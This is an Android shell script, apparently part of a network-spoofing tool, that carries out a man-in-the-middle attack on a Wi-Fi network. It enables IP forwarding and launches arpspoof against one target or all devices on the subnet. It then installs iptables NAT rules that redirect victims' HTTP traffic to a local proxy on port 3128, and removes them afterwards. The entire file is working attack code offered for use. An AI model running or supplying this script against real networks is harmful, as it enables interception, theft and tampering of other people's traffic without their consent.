#!/system/bin/sh
# When this script the following are set by the . command:
# WLAN, IP, SUBNET, MASK, SHORTMASK
# ARPSPOOF, IPTABLES
. $1
shift

# Detect a few settings

echo Current Wifi IP: $IP
echo Current subnet: $SUBNET
echo Subnet mask: $MASK

echo Enabling ip_forward
echo 1 > /proc/sys/net/ipv4/ip_forward

if [ "$1" = "all" ]
then
	echo "Starting ARP Spoofing for all devices"
	echo arpspoof -i $WLAN "$2"
	$ARPSPOOF -i $WLAN "$2" &
	ARP1="$!"
elif [ "$1" == "none" ]
then
	echo "Not arpspoofing at all."
else
	echo "Starting ARP Spoofing"
	echo arpspoof -i $WLAN -t "$1" "$2"
	$ARPSPOOF -i $WLAN -t "$1" "$2" &
	ARP1="$!"
fi

echo iptables -P FORWARD ACCEPT # Android 4.0 requires this
echo iptables -I natctrl_FORWARD -j RETURN
echo iptables -t nat -A POSTROUTING -j MASQUERADE
echo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128


$IPTABLES -P FORWARD ACCEPT || echo "iptables (1) failed" # Android 4.0 requires this
$IPTABLES -I natctrl_FORWARD -j RETURN || echo "iptables (2) failed" # Android 5.0 with tethering requires this
$IPTABLES -t nat -A POSTROUTING -j MASQUERADE || echo "iptables (3) failed"
$IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128 || echo "iptables (4) failed"

# Wait for finish
read

echo "Killing arpspoof"
kill $ARP1 2>/dev/null

# Stop stuff

echo iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
echo iptables -t nat -D POSTROUTING -j MASQUERADE
echo iptables -D natctrl_FORWARD -j RETURN

$IPTABLES -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128 || echo "iptables (5) failed"
$IPTABLES -t nat -D POSTROUTING -j MASQUERADE || echo "iptables (6) failed"
$IPTABLES -D natctrl_FORWARD -j RETURN || echo "iptables (7) failed"


wait
